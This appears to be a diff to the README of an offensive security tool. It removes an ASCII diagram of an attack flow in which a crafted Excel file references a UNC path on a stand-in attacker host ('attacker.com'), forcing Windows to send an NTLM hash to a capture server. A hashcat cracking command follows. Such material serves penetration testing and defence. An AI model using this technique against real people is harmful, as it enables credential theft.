@@ -71,37 +71,7 @@ reference is discovered and followed, and a real 3-step NTLM handshake captures 
 
 ## Attack Flow
 
-```
-  Attacker                          Victim
-  ────────                          ──────
-  excelcoon -m webdav               
-  -H attacker.com                   
-       │                              
-       ▼                              
-  quarterly_report.xlsx ──────────► Opens in Excel
-                                       │
-                                       ▼
-                              Excel parses OOXML
-                              Finds external image ref:
-                              \\attacker.com@80\img.png
-                                       │
-                                       ▼
-                              Windows WebClient service
-                              converts UNC → HTTP request
-                                       │
-  ┌────────────────────────────────────┘
-  │
-  ▼
-  Capture Server (port 80)
-  ← HTTP 401 (WWW-Authenticate: NTLM)
-  → NTLM Type 1 (Negotiate)
-  ← NTLM Type 2 (Challenge)
-  → NTLM Type 3 (Authenticate)  ◄── Hash captured here
-  
-  jsmith::CORP:1122334455667788:c657...
-  
-  $ hashcat -m 5600 hash.txt rockyou.txt
-```
+![](/output/excelcoon_flow.png)
 
 ---
 
